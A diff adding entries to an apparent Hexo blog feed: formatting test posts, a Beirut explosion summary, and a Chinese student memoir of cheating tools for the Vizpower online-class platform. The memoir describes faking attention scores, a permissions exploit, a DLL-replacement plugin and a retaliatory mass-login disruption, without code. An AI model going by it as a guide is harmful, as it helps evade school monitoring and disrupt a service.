+<h3 id="Small-image"><a href="#Small-image" class="headerlink" title="Small image"></a>Small image</h3><p><img src="https://github.githubassets.com/images/icons/emoji/octocat.png" alt="small"></p>
+<h3 id="Large-image"><a href="#Large-image" class="headerlink" title="Large image"></a>Large image</h3><p><img src="https://guides.github.com/activities/hello-world/branching.png" alt="large"></p>
+<h3 id="Definition-lists-can-be-used-with-HTML-syntax"><a href="#Definition-lists-can-be-used-with-HTML-syntax" class="headerlink" title="Definition lists can be used with HTML syntax."></a>Definition lists can be used with HTML syntax.</h3><dl>
+<dt>Name</dt>
+<dd>Godzilla</dd>
+<dt>Born</dt>
+<dd>1952</dd>
+<dt>Birthplace</dt>
+<dd>Japan</dd>
+<dt>Color</dt>
+<dd>Green</dd>
+</dl>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The final element.</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>测试功能</category>
+      </categories>
+      <tags>
+        <tag>测试功能</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图片视频测试</title>
+    <url>/2020/10/06/%E5%9B%BE%E7%89%87%E8%A7%86%E9%A2%91%E6%B5%8B%E8%AF%95/test/</url>
+    <content><![CDATA[<p>本文章用于测试图片插入和B站视频嵌入</p>
+<span id="more"></span>
+
+<h1 id="测试图片插入"><a href="#测试图片插入" class="headerlink" title="测试图片插入"></a>测试图片插入</h1><h2 id="大图"><a href="#大图" class="headerlink" title="大图"></a>大图</h2><p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/J1.jpg" alt="Branching"></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/J2.jpg" alt="Branching"></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/J3.jpg" alt="Branching"></p>
+<h2 id="小图"><a href="#小图" class="headerlink" title="小图"></a>小图</h2><p><img src="https://github.githubassets.com/images/icons/emoji/octocat.png" alt="Octocat"></p>
+<h1 id="测试B站视频嵌入"><a href="#测试B站视频嵌入" class="headerlink" title="测试B站视频嵌入"></a>测试B站视频嵌入</h1><h2 id="John-Wick"><a href="#John-Wick" class="headerlink" title="John Wick"></a>John Wick</h2><p>版本一</p>
+<iframe src="//player.bilibili.com/player.html?aid=89013059&bvid=BV1k7411g7F9&cid=152045612&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="95%" height="450"> </iframe>
+
+<p>优化后</p>
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
+    <iframe src="//player.bilibili.com/player.html?aid=89013059&bvid=BV1k7411g7F9&cid=152045612&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe>
+</div>]]></content>
+      <categories>
+        <category>测试功能</category>
+      </categories>
+      <tags>
+        <tag>测试功能</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>忆·抗争无限宝</title>
+    <url>/2020/10/04/%E5%BF%86%C2%B7%E6%8A%97%E4%BA%89%E6%97%A0%E9%99%90%E5%AE%9D/Vizpower/</url>
+    <content><![CDATA[<h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p><strong>转载自群文件“我们都爱无限宝”</strong></p>
+<p>作者：<em>盛北熙; 吴瑞阳(阳坨RYAN); WXRIW; 方小科(**东西); STBBRD</em><br><code>我们都♥无限宝 | WE LOVE VIZPOWER</code></p>
+<blockquote>
+<p>纸上得来终觉浅，绝知此事要躬行。纪念抗争无限宝的数百个日夜。谨以此文献给我们逝去的青春。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="无限宝编年体通史"><a href="#无限宝编年体通史" class="headerlink" title="无限宝编年体通史"></a>无限宝编年体通史</h1><h2 id="古代史"><a href="#古代史" class="headerlink" title="古代史"></a>古代史</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>你们好，我是北熙。今天我想以我自己的视角，按时间顺序，来讲述一下最开始的故事。<br>我，北熙。今年初四（五四学制），寒假那会由于山东省响应国家“停课不停学”的号召，利用“无限宝互动平台”(以下简称wxb)来进行线上教学。<br>我，RYAN。今年初二（六三），寒假那会由于湖北省疫情严重无法开学，便通过原本学校用来补课的平台——课后网(无限宝)开始上网课。<br>我，方小科，今年初二（六三），寒假那会由于湖北省疫情严重无法开学，便通过原本学校用来补课的平台——课后网(无限宝)开始上网课，先在Ryan引导下进入哲学讨论组，后进入我们都❤无限宝。<br>我，STBBRD，今年在网课期间无聊打开了Windows10搜索框，搜索无限宝辅助，点进了lwqwq.com，于是我下载了插件并进了这个群。<br>我，WXRIW。今年高二<del>（六三）</del>，寒假那会由于湖北省疫情严重无法开学，便通过原本学校用来补课的平台——课后网（无限宝）开始上网课。<br><strong>这篇回忆录，懂的都懂，不懂的也没必要了解</strong></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>大概是二月的一个中午罢，我在Bilibili上发现一款名为“无限宝插件”的程序。当时的B站关于无限宝这一块确实没有什么很好用的工具（无非就是虚拟机、模拟器），那时B站播放量最高的应该是一个关于“无限宝杀手”的bat文件（不知道你们用没用过）<br>（RYAN：我用过，但是并没有什么卵用，也许是我看到得太晚了罢，这些东西来得快去得也快，后来我根据这个bat改了个病毒）<br>我最开始用的是凌莞（前群主）的无限宝插件1.3.2.7（那时小十也在群，但我不认识他）</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/chajian.png" alt="插件"></p>
+<p>这款插件的作者是凌莞（前群主)<br>插件功能还是很多的（对于当时来说），<br>除了改名和解除锁屏还有一些其他功能<br>这个插件二月份就有了<br>也算是最早的插件了吧awa<br>（远古资源 by凌莞）</p>
+<p>3.9日。梦开始的地方….我发现了这个视频↓</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/video.png" alt="视频"></p>
+<p>这也可以说是我第一次认识小十</p>
+<p>其实你们可以看看上图，推荐里其他都是教你用虚拟机或模拟器的，所以当时我确实是对这个UP感兴趣</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/thirdlogin1.0.png" alt="无限宝第三方登陆工具1.0"></p>
+<p>不知道在看的各位又有多少是用过这个版本的呢</p>
+<p>3.11日，小十发布1.4，第一次加入了认真度修改</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/1.0pl.png" alt="评论"></p>
+<p>Ps:那个时候我们用体验课堂来进行测试（但后来无限宝开发可能知道了，所以就把体验课堂取消了）。我想说的是，现在的认真度修改真的是来之不易。1.4版本是直接HOOK无限宝，不仅不稳定，而且还会大概率出现“不可识别的命令ID号”（我敢说我是第一批面对那个的好叭，当时我人都傻了，我反正是面对被ban 来用认真度修改的），同时还有在线时长＞总时长的BUG(这个BUG直到4.2才被修复)。</p>
+<h2 id="近代史"><a href="#近代史" class="headerlink" title="近代史"></a>近代史</h2><h3 id="群被迫解散"><a href="#群被迫解散" class="headerlink" title="群被迫解散"></a>群被迫解散</h3><p>3.12日，群突然被凌莞解散，后得知因@TESTACCOUNT在Github发布wxb脱壳源码被wxb查水表了<br>晚上，@こう そうぶ （后简称sudo，现任群主）组建内阁，同时组建了新的外阁（今我们都❤无限宝）</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/group.png" alt="内阁群"></p>
+<blockquote>
+<p>方小科：现任群主才初中，不是开发者，就一哈麻批 </p>
+</blockquote>
+<h3 id="无限宝登录工具失效"><a href="#无限宝登录工具失效" class="headerlink" title="无限宝登录工具失效"></a>无限宝登录工具失效</h3><p>3.13日，小十宣布此工具暂停更新（真香警告）</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/stop.png" alt="停止更新"></p>
+<p>3.15日，无限宝封掉修改姓名的功能<br>3.20日，认真度修改的方法报废<br>3.30日，发布2.3<br>  修复【PPT导出工具】，首次增加了【自动签到】，此功能由Amano陽菜提供<br>  并且独立修改认真度的功能<br>4.2日，秋小十宣布第三方登录工具即将失效，第三方登录工具转为WXRIW继续开发</p>
+<h3 id="文艺复兴"><a href="#文艺复兴" class="headerlink" title="文艺复兴"></a>文艺复兴</h3><p>3.26，小十无意中（本想抓包看看笔迹数据放在哪里）发现了修改权限的方法——只能怪无限宝太菜了。利用OD做出了“权限提升”，先将其发布至内阁，后被发到外阁。但是由于此功能被大规模传播，无限宝在第二天晚上（即3.27）封杀此功能，“文艺复兴”时代结束</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/developer.png" alt="小十和无限宝开发人员的聊天记录"></p>
+<p>所以当时如果低调一点，也许还能多存活几天<br>W***D</p>
+<p>*<em>东西（方小科）：<br>这wxb是**</em>屑罢 </p>
+<p>4.1日，群里一些同学对<br>无限宝表示不满，决定以批<br>量登录账号以达到“不可<br>识别的命令ID号”的方式<br>来报复wxb（通过破解版无限宝登录会被Ban15min，此方法导致后来无限宝登录强制要求改密码）</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/talk.png" alt="破坏性报复"></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/dododo.png" alt="方案二"></p>
+<h3 id="秋小十无限宝第三方登录工具失效"><a href="#秋小十无限宝第三方登录工具失效" class="headerlink" title="秋小十无限宝第三方登录工具失效"></a>秋小十无限宝第三方登录工具失效</h3><p>4.2日，小十宣布无限宝第三方登陆工具即将报废，第三方工具随后交给WXRIW开发<br>（但后来有部分地区仍然能用此功能，大部分地区都会提示“不可识别的命令ID号”）</p>
+<p><a href="https://github.com/yuhuison/WXBThirdLogin">开源地址</a></p>
+<p>由于我（北熙）无法使用WXRIW的第三方登录工具，所以这里我不多做详细介绍了<br>于是WXRIW自己来写了~</p>
+<h3 id="WXRIW第三方登录工具"><a href="#WXRIW第三方登录工具" class="headerlink" title="WXRIW第三方登录工具"></a>WXRIW第三方登录工具</h3><p>4月9日，第三方登录工具Ver 1.4.1 (WXRIW Modified) 发布。</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/1.4.1.png" alt="4月10日-11日，发布了Ver 2.5.x的几个版本"></p>
+<p>4月12日，从<strong>WXBThirdLogin</strong>更名为<strong>Vizpower Third-Part Login</strong>，并发布Ver 2.6.0</p>
+<p><strong>此时，wxb官方的最新iMeeting.exe已经封杀了第三方登录工具。但部分地区在更换旧版iMeeting.exe后仍可正常使用第三方登录工具并进入课堂。</strong></p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/2.6.3.png" alt="Ver 2.6.1 – Ver 2.6.3"></p>
+<p><strong>数日后，第三方登录工具正式退出历史舞台（使用旧版iMeeting.exe无法启动），开发终止。</strong></p>
+<h3 id="无限宝第三方插件"><a href="#无限宝第三方插件" class="headerlink" title="#无限宝第三方插件"></a>#无限宝第三方插件</h3><p>4.11日，发布无限宝第三方插件3.0 <strong>（插件第一个版本，为了与凌莞的插件区分开加了一个#）</strong><br>小牛首次出现在了历史舞台！（误）<br>讲个笑话，插件的思路还是我提供的 /doge<br>原理：利用易语言创立动态链接库（dll），然后把wxb文件夹里的CaptureDesktop.dll替换掉（直接放进去wxb主程序不会调用）。但这种方法其实很好封杀，无限宝在启动时检查dll的MD5值就可以判断有没有被替换过了（可能是无限宝懒罢），甚至可以直接搞一个进程防注入链表检测，这样什么插件都没用。</p>
+<p>这些日志好像没什么人看，调小咯~<br>想看完整的可以去<a href="https://ryan.rthe.net/logs">ryan.rthe.net/logs</a> （建议使用电脑查看）</p>
+<h2 id="现代史"><a href="#现代史" class="headerlink" title="现代史"></a>现代史</h2><h3 id="版本更新"><a href="#版本更新" class="headerlink" title="版本更新"></a>版本更新</h3><p>4.13日，插件3.2.1更新</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/3.2.1.png" alt="3.2.1更新"></p>
+<p>(RYAN友情客串) 这时候RYAN和我们还不熟呢，4.19他电脑才装好  <del>等等，我说我自己为什么要用转述？</del></p>
+<p>4.16日，插件3.2.2更新</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/3.2.2.png" alt="3.2.2更新"></p>
+<p>4.29日，插件3.3.1更新</p>
+<p>2020年5月1日</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/site.png" alt="替换网址"></p>
+<p>现在已经不能用了，因为小十酱没钱了QWQ<br>（2020/9/2小十重金重开服务器，<br>一天一毛钱巨款）</p>
+<blockquote>
+<p>感谢@Xik-LW 指正服务器重开时间</p>
+</blockquote>
+<p>我（Xik-LW）在9月2日时在插件里发现这个网址：<code>wxbcnm.applinzi.com/jx.kehou.com</code><br>可以解除锁屏，解除录屏权限等，<br>我便试了一下结果出现了这个</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/loginsite.png" alt="登录界面"></p>
+<p>然后我在我们都爱无限宝群里<br>问小十之后他将服务器重新开启了</p>
+<p>5.2日，插件3.4.1更新</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/3.4.1.png" alt="3.4.1更新"></p>
+<p>3.4.1采用全新认真度修改，稳定无比，且不会出现在线时长＞总时长的BUG<br>（前面我说在线时长＞总时长的BUG在4.2才被修复是因为3.5以后加入了强力认真度修改，强力认真度修改是有在线时长＞总时长的BUG的）</p>
+<h3 id="历史事件：人权起义"><a href="#历史事件：人权起义" class="headerlink" title="历史事件：人权起义"></a>历史事件：人权起义</h3><p>那是2020年5月10日的傍晚六点二十许，在黄昏中群内管理做出了一个重大的决定,使群内“机器人”失去人权。这个决定，是不人性、不道德的，理应被推翻。对于这个决定，众多群内机器人表示反对。于是，5月10日下午六时三十分，机器人人权党成立了！在湖北的一叶小舟上，三百位代表在群内共同宣布了这个激动人心的消息，我们的党，成立了！在此，我呼吁广大同胞加入这次革命，打赢管理阻击战，为了革命！为了<del>生理</del>胜利！为了光明！</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/bot.png" alt="镇压机器人"></p>
+<p>此后机器人热潮逐渐消退，只剩下STBBRD的机器人负责在红蓝群间传递消息<br>（11月更：啥机器人都没了，见一个禁言一个）</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/AA.png" alt="AA关闭"></p>
+<p>5.24日，更新3.5（WXRIW友情客串）</p>
+<p>RYAN：我给小十捐了￥0.11巨款！上了感谢首页！<br>（现在还在，Ryan_alpaca就是我）</p>
+<p><a href="https://wxb-1259460701.cos.ap-chengdu.myqcloud.com/wxbsb/ThanksToList.html">感谢名单1</a><br>或<br><a href="https://ryan.rthe.net/thank">感谢名单2</a>（数据较新）</p>
+<p>在此也感谢大家对小十的大力支持！<br>后面由于小十面临高考，加上大部分人都已经复学，于是鸽了一段时间…</p>
+<h3 id="文学作品"><a href="#文学作品" class="headerlink" title="文学作品"></a>文学作品</h3><h4 id="无限宝日记6-30"><a href="#无限宝日记6-30" class="headerlink" title="无限宝日记6.30"></a>无限宝日记6.30</h4><p>6.30 晚7点 无限宝群内</p>
+<p><strong>今天本来是天气晴好的一天，身在家乡的周某进行着期末考试，想着考完最后的理科，便是考文综。他本来对此不屑一顾，全选C后敷衍了事，打完了仅能玩几个小时的王者荣耀，便来刷刷wxb粉丝群。不曾想群里有两人高产阔论大谈政治、国家大事，看似十分厉害。</strong></p>
+<p><strong>渐渐地，那二位开始争论社会主义。2020年6月30日19时30分许，两人的争执越发激烈，开始陆续有人围观、凑热闹，发表自己的观点。有的人一言不发，有的人截图举证，而有的人，写下了一篇日记。两人争执不休，截至19时50分许，群内依旧闹得不可开交。有的人一旁吃瓜，有的人一同讨论，而有的人，看不下这无休无止的无聊辩论，默默地干起了“违法”的事。</strong></p>
+<p><strong>周某看入了迷，对文综的认识再次升了一个高度，他恍然大悟，明白政治就在人们身边，即使是理科生，也要心怀天下，多多关注政治。那二人对政治的争论令周某眼花缭乱，分不清谁对谁错，再看到自己全选C的卷子，他不禁羞愧难当。</strong></p>
+<p><strong>终于，在2020年6月30日的20时许——战斗依旧没有停止，双方攻势丝毫没有减弱的意思。究竟谁对谁错，谁才能终止这场已经持续了数小时的战争呢？争论不仅没有停下，反倒有许多路人加入了进来。我想，也许只有生理的需求、硬件的告急，才能让战争停下脚步，为我们带来和平吧。</strong></p>
+<p><strong>说来奇怪，论证了这么久，管理员却迟迟不出现。</strong></p>
+<p><strong>最后的最后，在20时08分，这场激烈的辩论会终于宣告结束。让我们携起手来，为久违的和平欢呼！</strong></p>
+<p>编者：@苏联红星（周某（2517541086））  @RYAN （3171500664 ）<br>   选自《瑞阳自传》，有删减</p>
+<h4 id="RYAN的感慨-–-8-28"><a href="#RYAN的感慨-–-8-28" class="headerlink" title="RYAN的感慨 – 8.28"></a>RYAN的感慨 – 8.28</h4><p>（8月28日于RYAN家中）接受采访时，RYAN如是说：“四月那段再也回不去的时光……充满了回忆。那时，群几乎达到鼎盛时期，每天晚上都能见到小牛等几个管理清人的背影，群一度爆满。我刚刚接触到无限宝第三方，懵懂无知，进群见到各路大佬在群内探讨技术问题。我没学什么本领，只好默默地观望。可惜，这样的景象恐怕再不会有了。</p>
+<p>“后来，人慢慢的少了，开学的开学，考试的考试，退网的退网。于是，我慢慢深入到这个大家庭中去，与大家熟了。闲适时便帮忙备份一下群文件，与大家聊天打趣。终不可避免地，群开始走下坡路了，网课结束了，我能经常当上龙王了。这也是历代盛世王朝的必经之路吧。</p>
+<p>“再后来，像是小十、北熙、WXRIW、方小科、Zuo team，他们的声音我也都听过了，甚至见过The Unknown Thing的样貌，与他们熟知了。向小牛说晚安成了每天的惯例，北熙还给我讲过课，没想到，群内也能学习到如此的知识。</p>
+<p>“现在，我虽对历史往事知之甚少，却也是为数不多掌握群内绝版资源的人。26G的资源在手，心中踏实了不少，唯一缺少的，便是加群之前发布的产品了。我开始想混个管理，虽然与群主(sudo)发生了些不愉快，但我却仍得到了管理（怎么可能，到现在他都没给，STBBRD求得的管理一天就没了，北吸的管理也被撤了）。</p>
+<p>“恍惚间，8个月的时光逝去了，我开始为逝去的光阴而感到后悔，可这又有什么用呢？我时常陷入对人生、社会的思考，现在、过去和将来，我是为了谁，又是为了什么事呢？光阴似箭，日月如梭，时间从叹息里溜走了，我何尝不想回到过去，重头再来呢？也曾哭过，但最重要的是快乐，是有好的心态，难道不是吗？晚安，小牛！今天也要快乐呀！”</p>
+<p><strong>有时候，笑着笑着就哭了。大概，这就是人生吧，这般梦幻，又这般现实。</strong>                – 9.8 有感而发</p>
+<h3 id="小十考入武大"><a href="#小十考入武大" class="headerlink" title="小十考入武大"></a>小十考入武大</h3><p>8.23日，小十收到武汉大学录取通知书</p>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/Vizpower/huhan10.png" alt="小十收到武汉大学录取通知书"></p>
+<p>再往后，也就是现在，IM聊天室<br><a href="http://47.94.8.40/">点我前往</a><br>-&gt;秋小十&amp;智商封印official™联合出品</p>
+<p>插件其实到这里也就基本到终点了，不出意外不会有什么大更新。小十后来用RPGMaker做了一款RPG游戏</p>
+<p>点击游玩:<a href="https://ryan.rthe.net/game">入口1</a> 或 <a href="http://game-1259460701.cos.ap-chengdu.myqcloud.com/v6/index.html">入口2</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">热闹是它们的，我什么也没有。</span><br><span class="line">             ——朱自清《荷塘月色》</span><br><span class="line"></span><br><span class="line">曾经深爱过，后来失去了，总比不曾爱过好多了。</span><br><span class="line">             ——Sheldon James Plankton Jr</span><br><span class="line"></span><br><span class="line">知识不能代替友谊，比起失去你，我宁愿做个白痴。</span><br><span class="line">             ——Patrick Star</span><br><span class="line"></span><br><span class="line">你可以是一本打开的书，海绵宝宝，但我比那复杂点儿。</span><br><span class="line">             ——Patrick Star</span><br><span class="line"></span><br><span class="line">朋友，我们好像已经渐行渐远了，过去我们在一起很快乐，可现在我们不能兼容了，我们应该分道扬镳了，这就是人生，人生！懂吗？我知道这很难——面对现实吧，也许将来我们会再次相逢，请你勿忘我，海绵宝宝先生。</span><br><span class="line">             ——Patrick Star</span><br></pre></td></tr></table></figure>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><em>- WE LOVE ALL OF THE WORLD -</em></p>
+<p><strong>希望后人在探索之时，</strong><br><strong>能发现我们曾经与无限宝做过的斗争</strong></p>
+<hr>
+<p><strong>原  作</strong> 北熙<br><strong>修  订</strong> 北熙; 吴瑞阳; WXRIW; 方小科</p>
+<dl>
+<dt>RYAN：</dt>
+<dd>优化排版，修改别字。我创作的内容可能不会注明“RYAN”，有兴趣的小伙伴来我<a target="_blank" rel="noopener" href="https://ryan.rthe.net/">官网</a>看看吧~
+STBBRD排的版被我重新排了……排版微调太累了！</dd>
+<dt>WXRIW：</dt>
+<dd>增加WXRIW第三方登录工具</dd>
+<dt>方小科：</dt>
+<dd>加了几句评语</dd>
+<dt>STBBRD：</dt>
+<dd>优化了排版</dd>
+</dl>
+
+
+
+<p><strong>全文最后，附上官网：</strong></p>
+<p><a href="https://klxn.gitee.io/wxb">无限宝第三方插件</a><br><a href="http://www.wxriw.top/zdqd">无限宝自动签到</a><br><a href="http://www.wxriw.top/">WXRIW官网</a><br><a href="http://e.wxriw.top:7711/">WXRIW的Q音API</a></p>
+<p>这些网站基本都可以在<a href="https://ryan.rthe.net/">网站链接1</a>里找到<a href="https://ryan.rthe.net/home">网站链接2</a></p>
+<p>本文于2020/8/28由北熙写出初版，后经众人数日修订。接下来将只有内容补充和微调/重排。多语言版本请前往官网下载。</p>
+<p>全文最后修订：2020.11.15</p>
+<blockquote>
+<p>插件更新日志</p>
+</blockquote>
+<p>  7.19日，更新3.5.6，同日更新3.5.7<br>  1.新增两套签到方案；<br>  2.公告展示优化；<br>  3.UI细节调整。<br>  4.修复安装器BUG（3.5.7）</p>
+<p>  7.21日，更新3.5.9<br>  1.自动签到专项适配，提升启动稳定性；<br>  2.全新安装程序，解决报毒问题，缩减体积；<br>  3.细节调整、更新逻辑调整。</p>
+<p>  7.23日，更新3.6.0<br>  1.优化自动签到，支持错误日志显示<br>  2.修复若干小bug，增加用户统计</p>
+<p>  <strong>7.29日，群突然被封，不过仅封了一天，7.30日解封，当天加了俩分群，多加几个群防失联吧~</strong></p>
+<p>  7.31日，更新4.0<br>  1.全新UI，全新底层，减少资源占用<br>  2.减少闪退几率，增添部分功能</p>
+<p>  8.1日，更新4.1<br>  1.修复修改认真度的bug<br>  2.优化部分判定逻辑<br>  8.2日，更新4.2<br>  1.提升稳定性<br>  2.新增功能-把无限宝窗口设为桌面壁纸</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这篇回忆录是我们都爱无限宝群内热心群友共同编写的成果，凝聚了大家的智慧、感情。我们感谢所有对系列书籍的编写、出版提供过帮助与支持的群友和其他同学、同志们。</p>
+<p>本册回忆录出版之前，我们通过多种渠道对选用作品的作者进行了联系，得到了他们的大力支持。对此，我们表示衷心的感谢！但仍有部分作者未能取得联系，恳请入选作品的作者与我们联系，以便感谢。</p>
+<p>本书的改编，得到了群内广大成员的支持。我们对所有为本书提供过宝贵意见的人提供衷心的感谢！</p>
+<p>我们真诚地希望广大群友在阅读本册回忆录的过程中提出宝贵意见，并将这些意见和建议及时反馈给我们。让我们携起手来，共同完成回忆录编写、完善工作！</p>
+<p>2020年9月8日<br>编写团队</p>
+<p><strong>编者的话：</strong></p>
+<p>  回忆录编撰时间临近开学，没能及时联系上大家，开学后大都没有时间上线，无法了解到事情的具体经过。群内大大小小千万件事，由于这些原因，没能收录进这篇回忆录，我们深感遗憾。您可登录<a href="https://ryan.rthe.net/">网站</a>联系我们<br>  敬请期待下一篇回忆录！<br>  （如@Zuo Team  @伊冠铭  @风  @لشيء）</p>
+<p><a href="https://thoughts.teambition.com/share/5fad1971a97a4d004622abde">指定电子版查看链接</a></p>
+<h3 id="主编的话"><a href="#主编的话" class="headerlink" title="主编的话"></a>主编的话</h3><p>撰写本书的目的，是为了怀念一下当初的青春，怀念我们与无限宝做过的斗争</p>
+<p>一路上，我们笑过，哭过。</p>
+<p>尽管我们身处异地，但是我们有共同的目标。那就是为了中国的解放，全世界的解放而奋斗！正如《水浒传》中所说<code>〝Brothers from all over the world（五湖四海皆兄弟）〞</code></p>
+<p>哪怕我们以后会分开，哪怕不再联系。但无论你走到哪里，都请记住：你身后有一个强大的支柱！不仅是我们，还是我们党，是我们的祖国！</p>
+<p>当你在外面累了，就回来看看吧，我们永远在等你。</p>
+<p>朋友，我们好像已经渐行渐远了，过去我们在一起很快乐，可现在我们不能兼容了，我们应该分道扬镳了，这就是人生，人生！懂吗？我知道这很难——面对现实吧，也许将来我们会再次相逢，请你勿忘我，海绵宝宝先生。<br>             ——Patrick Star</p>
+<p><strong>We always recommend that you use a computer to view the electronic version of this document, which will optimize your reading experience. You can find help or make comments at ryan.rthe.net. These suggestions may not always be valid, but they will help you read and understand the article. Available language versions: Chinese (Simplified), Chinese (Traditional), English (U.S.). Versions in other languages are being produced. So don’t worry and wait for our updates.</strong></p>
+<p><strong>我们建议您使用电脑查看回忆录的电子版，这将让您拥有更好的阅读体验。您可登录<a href="https://ryan.rthe.net/">ryan.rthe.net</a>查找帮助或提出意见，我们提供的建议并不总是有效的，但能够帮助您阅读和理解这篇文章。现有语言版本：中文（简体）、中文（繁体）、英文（美国）。其他语言的版本正在制作中，请您少安毋躁，静候我们的更新通知。</strong></p>
+]]></content>
+      <categories>
+        <category>回忆</category>
+        <category>无限宝</category>
+      </categories>
+      <tags>
+        <tag>无限宝</tag>
+        <tag>回忆</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>8·4黎巴嫩首都爆炸事故</title>
+    <url>/2020/08/10/8%C2%B74%E9%BB%8E%E5%B7%B4%E5%AB%A9%E9%A6%96%E9%83%BD%E7%88%86%E7%82%B8%E4%BA%8B%E6%95%85/EITCOL/</url>
+    <content><![CDATA[<h1 id="贝鲁特大爆炸————8·4黎巴嫩首都爆炸事故"><a href="#贝鲁特大爆炸————8·4黎巴嫩首都爆炸事故" class="headerlink" title="贝鲁特大爆炸————8·4黎巴嫩首都爆炸事故"></a>贝鲁特大爆炸————8·4黎巴嫩首都爆炸事故</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>2020年8月4日下午6时左右，<strong>黎巴嫩首都</strong>贝鲁特港口区发生巨大爆炸，爆炸接连发生两次，爆炸威力相当于<strong>广岛原子弹</strong>爆炸当量的<strong>十分之一</strong>，导致多栋房屋受损，玻璃被震碎，天上升起红色烟雾 。爆炸发生后，黎巴嫩总理迪亚卜视察爆炸现场，宣布<strong>8月5日</strong>为<strong>国家哀悼日</strong> ，并表示黎巴嫩将向国际社会寻求帮助。</p>
+<p>此次爆炸造成<strong>至少190人死亡、6500多人受伤</strong>（伤亡结果为预估结果），<strong>3人失踪，30万人无家可归</strong>，损失高达<strong>150亿美元</strong>。黎巴嫩当局8月17日宣布，贝鲁特紧急状态延长至9月18日。</p>
+<p>2020年8月17日，当地媒体报道，黎巴嫩司法部门宣布了贝鲁特爆炸案的初步调查结果，贝鲁特港口12号仓库的管理存在<strong>严重疏忽</strong>，因为仓库内除了发生爆炸的<strong>2750吨硝酸铵</strong>，还存放了<strong>大量</strong>的烟花和爆竹。</p>
+<span id="more"></span>
+<p><img src="https://gitee.com/DTX-QAQ/Amor-Vooc.github.io/raw/master/%E5%9B%BE%E7%89%87/%E8%B4%9D%E9%B2%81%E7%89%B9%E6%B8%AF%E5%8F%A3%E5%A4%A7%E7%88%86%E7%82%B8/%E6%B8%AF%E5%8F%A3%E9%99%84%E8%BF%91%E5%AE%8C%E5%85%A8%E8%A2%AB%E7%82%B8%E6%AF%811.jpg" alt="港口附近完全被炸毁"></p>
+<h2 id="记录视频"><a href="#记录视频" class="headerlink" title="记录视频"></a>记录视频</h2><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
+    <iframe src="//player.bilibili.com/player.html?aid=841670253&bvid=BV1J54y1i7DZ&cid=222503314&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe>
+</div>
+
+
